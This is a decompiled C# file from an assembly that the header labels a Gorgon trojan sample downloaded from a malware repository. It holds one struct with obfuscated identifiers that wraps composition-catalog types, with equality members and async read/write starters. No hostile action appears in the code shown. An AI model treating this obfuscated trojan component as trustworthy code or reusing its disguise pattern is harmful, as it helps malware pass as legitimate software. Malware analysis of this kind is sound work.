// Decompiled with JetBrains decompiler
// Type: xNMEDFl.JV1WxGp
// Assembly: gO77Fih, Version=16.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a
// MVID: F43F05C3-DF79-4EF2-8C94-619BF1ED6D3E
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Gorgon.gen-83f6c309f411e1aebbdf75c62f67f163231f1b0ee065936230741272cda1cb9a.exe

using Microsoft.VisualStudio.Composition;
using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using wDXXQb8;
using z22cHri;

namespace xNMEDFl
{
  public struct JV1WxGp : IEquatable<JV1WxGp>
  {
    private static readonly Encoding VamieIg = Encoding.UTF8;

    public JV1WxGp(
      string primaryAssemblyPath,
      ComposableCatalog catalog,
      IReadOnlyDictionary<string, \u0034GW7en3> inputAssemblyPathAndMetadata)
      : this()
    {
      this.mmDxEet = primaryAssemblyPath;
      this.KWbr0KE = catalog;
      this.kg2RNJv = inputAssemblyPathAndMetadata;
    }

    public string mmDxEet { get; private set; }

    public ComposableCatalog KWbr0KE { get; private set; }

    public IReadOnlyDictionary<string, \u0034GW7en3> kg2RNJv { get; private set; }

    public static bool operator ==(JV1WxGp left, JV1WxGp right) => left.ZWftAMv(right);

    public static bool operator !=(JV1WxGp left, JV1WxGp right) => !(left == right);

    [CLSCompliant(false)]
    public static Task<JV1WxGp> \u0032t6MJx3(
      Stream _param0,
      CachedCatalog eJUmhUQ,
      Resolver KkoVAv9,
      CancellationToken _param3)
    {
      // ISSUE: variable of a compiler-generated type
      JV1WxGp.rgO3Wxb stateMachine;
      // ISSUE: reference to a compiler-generated field
      stateMachine.yZdAuxA = _param0;
      // ISSUE: reference to a compiler-generated field
      stateMachine.\u0038KC4KNS = eJUmhUQ;
      // ISSUE: reference to a compiler-generated field
      stateMachine.\u0034yX4bsz = KkoVAv9;
      // ISSUE: reference to a compiler-generated field
      stateMachine.S0mYTi5 = _param3;
      // ISSUE: reference to a compiler-generated field
      stateMachine.SHR8JQ3 = AsyncTaskMethodBuilder<JV1WxGp>.Create();
      // ISSUE: cast to a reference type
      // ISSUE: explicit reference operation
      // ISSUE: reference to a compiler-generated field
      (^(\u00359ZH9oz.l6LUcfa&) ref stateMachine).kckvZOW = -1;
      // ISSUE: reference to a compiler-generated field
      stateMachine.SHR8JQ3.Start<JV1WxGp.rgO3Wxb>(ref stateMachine);
      // ISSUE: reference to a compiler-generated field
      return stateMachine.SHR8JQ3.Task;
    }

    [CLSCompliant(false)]
    public Task znMKxfU(Stream nayXAH6, CachedCatalog HR5Fl2e, CancellationToken fArasOZ)
    {
      // ISSUE: variable of a compiler-generated type
      JV1WxGp.BTO7d7D stateMachine;
      // ISSUE: reference to a compiler-generated field
      stateMachine.z09DOwm = this;
      // ISSUE: reference to a compiler-generated field
      stateMachine.hYKAJbL = nayXAH6;
      // ISSUE: reference to a compiler-generated field
      stateMachine.FrAz4Tm = HR5Fl2e;
      // ISSUE: reference to a compiler-generated field
      stateMachine.FZosRsh = fArasOZ;
      // ISSUE: reference to a compiler-generated field
      stateMachine.dQSfkk6 = AsyncTaskMethodBuilder.Create();
      // ISSUE: cast to a reference type
      // ISSUE: explicit reference operation
      // ISSUE: reference to a compiler-generated field
      (^(JV1WxGp.rgO3Wxb&) ref stateMachine).RmQwrMR = -1;
      // ISSUE: reference to a compiler-generated field
      stateMachine.dQSfkk6.Start<JV1WxGp.BTO7d7D>(ref stateMachine);
      // ISSUE: reference to a compiler-generated field
      return stateMachine.dQSfkk6.Task;
    }

    public virtual bool \u0037evT3NE(object nSKnh9u) => nSKnh9u is JV1WxGp I3lTcuT && this.ZWftAMv(I3lTcuT);

    public bool ZWftAMv(JV1WxGp I3lTcuT) => StringComparer.OrdinalIgnoreCase.Equals(this.mmDxEet, I3lTcuT.mmDxEet) && EqualityComparer<ComposableCatalog>.Default.Equals(this.KWbr0KE, I3lTcuT.KWbr0KE);

    public virtual int WSVnOgA() => StringComparer.OrdinalIgnoreCase.GetHashCode(this.mmDxEet);
  }
}
